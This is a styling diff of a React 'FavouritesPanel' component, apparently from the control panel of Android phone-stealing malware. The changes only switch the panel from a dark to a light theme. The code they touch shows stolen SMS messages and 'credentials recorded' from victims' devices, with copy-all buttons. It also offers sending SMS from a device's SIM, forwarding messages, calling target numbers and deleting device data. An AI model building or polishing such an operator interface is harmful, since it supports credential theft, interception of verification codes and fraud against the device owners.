@@ -151,13 +151,13 @@ export default function FavouritesPanel({
         <div
           className="empty-luxury"
           style={{
-            background: "linear-gradient(145deg, #181d2a, #111520)",
+            background: "#ffffff",
             border: "1px solid var(--border-color)",
             borderRadius: "var(--radius)",
             padding: "36px 20px",
           }}
         >
-          <i className="fas fa-star empty-icon" style={{ color: "var(--gold)", opacity: 0.6, fontSize: 36 }}></i>
+          <i className="fas fa-star empty-icon" style={{ color: "var(--gold)", fontSize: 36 }}></i>
           <h4 style={{ color: "var(--text-primary)", fontSize: 16, marginBottom: 4 }}>No Favourite Devices</h4>
           <p style={{ color: "var(--text-muted)", fontSize: 12 }}>
             Devices panel me kisi bhi device card ke Star (★) icon par click karein.
@@ -211,10 +211,11 @@ export default function FavouritesPanel({
                         onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                         className="btn-sm"
                         style={{
-                          background: "rgba(239, 68, 68, 0.15)",
+                          background: "#fee2e2",
                           color: "var(--red)",
                           padding: "2px 8px",
                           borderRadius: 6,
+                          border: "1px solid #fca5a5"
                         }}
                       >
                         Remove
@@ -294,9 +295,9 @@ export default function FavouritesPanel({
                         </div>
                         <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                           {smsList.slice(0, 8).map((m, i) => (
-                            <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
+                            <div key={i} style={{ background: "#ffffff", padding: 8, borderRadius: 6, border: "1px solid var(--border-color)", borderLeft: "3px solid var(--gold)" }}>
                               <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
-                                <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
+                                <span style={{ color: "var(--text-primary)", fontWeight: 700 }}>{m.sender || m.address}</span>
                                 <span>{m.date || ""}</span>
                               </div>
                               <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
@@ -317,9 +318,9 @@ export default function FavouritesPanel({
                             <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                           ) : (
                             loginList.map((cred, i) => (
-                              <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
-                                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
-                                  <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
+                              <div key={cred.key || i} style={{ background: "#ffffff", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
+                                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid var(--border-color)" }}>
+                                  <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold-light)" }}>Record #{i + 1}</span>
                                   <button
                                     type="button"
                                     onClick={() => {
@@ -331,17 +332,17 @@ export default function FavouritesPanel({
                                       showToast("📋 All fields copied!", "success");
                                     }}
                                     className="btn-sm"
-                                    style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
+                                    style={{ background: "#fef3c7", color: "var(--gold-light)", border: "1px solid #fde68a", padding: "2px 8px", borderRadius: 4, cursor: "pointer", fontWeight: 600 }}
                                   >
                                     <i className="fas fa-copy"></i> Copy All
                                   </button>
                                 </div>
 
                                 {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
-                                  <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
-                                    <span style={{ color: "var(--text-muted)" }}>{k}:</span>
+                                  <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed var(--border-color)" }}>
+                                    <span style={{ color: "var(--text-secondary)", fontWeight: 500 }}>{k}:</span>
                                     <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-                                      <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
+                                      <span style={{ color: "var(--text-primary)", fontWeight: 700 }}>{String(v)}</span>
                                       <button
                                         type="button"
                                         onClick={() => copyToClipboard(v, k)}
@@ -374,10 +375,10 @@ export default function FavouritesPanel({
                                 padding: "8px",
                                 borderRadius: 8,
                                 border: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                                background: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                                color: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                                background: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "#fef3c7" : "#ffffff",
+                                color: (formMemory[`fav-smsSim-${devId}`] || "0") === "0" ? "var(--gold-light)" : "var(--text-secondary)",
                                 fontSize: 11,
-                                fontWeight: 600,
+                                fontWeight: 700,
                                 cursor: "pointer",
                                 textAlign: "center"
                               }}
@@ -391,10 +392,10 @@ export default function FavouritesPanel({
                                 padding: "8px",
                                 borderRadius: 8,
                                 border: formMemory[`fav-smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                                background: formMemory[`fav-smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                                color: formMemory[`fav-smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                                background: formMemory[`fav-smsSim-${devId}`] === "1" ? "#fef3c7" : "#ffffff",
+                                color: formMemory[`fav-smsSim-${devId}`] === "1" ? "var(--gold-light)" : "var(--text-secondary)",
                                 fontSize: 11,
-                                fontWeight: 600,
+                                fontWeight: 700,
                                 cursor: "pointer",
                                 textAlign: "center"
                               }}
@@ -407,7 +408,7 @@ export default function FavouritesPanel({
                           type="text" 
                           placeholder="Recipient Phone Number" 
                           className="search-input" 
-                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                          style={{ background: "#ffffff", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-smsNum-${devId}`] || ""}
                           onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsNum-${devId}`]: e.target.value }))}
                         />
@@ -415,7 +416,7 @@ export default function FavouritesPanel({
                           placeholder="Type Message Content..." 
                           rows="3"
                           className="search-input" 
-                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
+                          style={{ background: "#ffffff", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                           value={formMemory[`fav-smsText-${devId}`] || ""}
                           onChange={(e) => setFormMemory(p => ({ ...p, [`fav-smsText-${devId}`]: e.target.value }))}
                         />
@@ -438,7 +439,7 @@ export default function FavouritesPanel({
                           type="text" 
                           placeholder="Forward To Phone Number" 
                           className="search-input" 
-                          style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                          style={{ background: "#ffffff", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-fwdNum-${devId}`] || ""}
                           onChange={(e) => setFormMemory(p => ({ ...p, [`fav-fwdNum-${devId}`]: e.target.value }))}
                         />
@@ -468,7 +469,7 @@ export default function FavouritesPanel({
                           type="text" 
                           placeholder="Target Phone Number" 
                           className="search-input" 
-                          style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                          style={{ background: "#ffffff", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                           value={formMemory[`fav-callNum-${devId}`] || ""}
                           onChange={(e) => setFormMemory(p => ({ ...p, [`fav-callNum-${devId}`]: e.target.value }))}
                         />
@@ -488,7 +489,7 @@ export default function FavouritesPanel({
                     )}
 
                     {curTab === "delete" && (
-                      <div className="section-premium" style={{ borderColor: "var(--red)" }}>
+                      <div className="section-premium" style={{ borderColor: "#fca5a5", background: "#fef2f2" }}>
                         <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                           <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
